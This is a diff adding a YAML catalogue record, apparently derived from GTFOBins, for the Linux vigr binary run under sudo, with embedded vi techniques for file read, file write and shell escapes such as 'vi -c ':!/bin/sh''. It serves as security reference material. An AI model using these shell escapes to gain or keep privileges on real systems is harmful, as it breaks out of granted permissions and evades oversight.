@@ -1,0 +1,132 @@
+id: gtfobins/vigr/inherit/sudo
+type: binary
+platform: linux
+name: vigr
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: vigr
+  comment: Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.
+references:
+- https://gtfobins.github.io/gtfobins/vigr/
+- https://gtfobins.github.io/gtfobins/vi/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        vigr:
+          functions:
+            inherit:
+            - code: vigr
+              comment: Despite requiring superuser privileges to run, the editor is executed as the unprivileged
+                user.
+              contexts:
+                sudo: null
+                suid: null
+              from: vi
+        vi:
+          functions:
+            file-read:
+            - code: vi /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: 'vi /path/to/output-file
+
+                iDATA
+
+                ^[
+
+                w'
+              comment: Where `^[` is the escape key.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: vi -c ':!/bin/sh' /dev/null
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':shell'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':set shell=/bin/sh | shell'
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':set shell=/bin/sh\ -p | shell'
+                  shell: false
+                unprivileged: null
+            - code: vi -c :terminal /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':terminal /bin/sh -p'
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/vigr/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:8744551a7460b589df728853956007378d68f41c09d123c5ee2b3b20cb055869
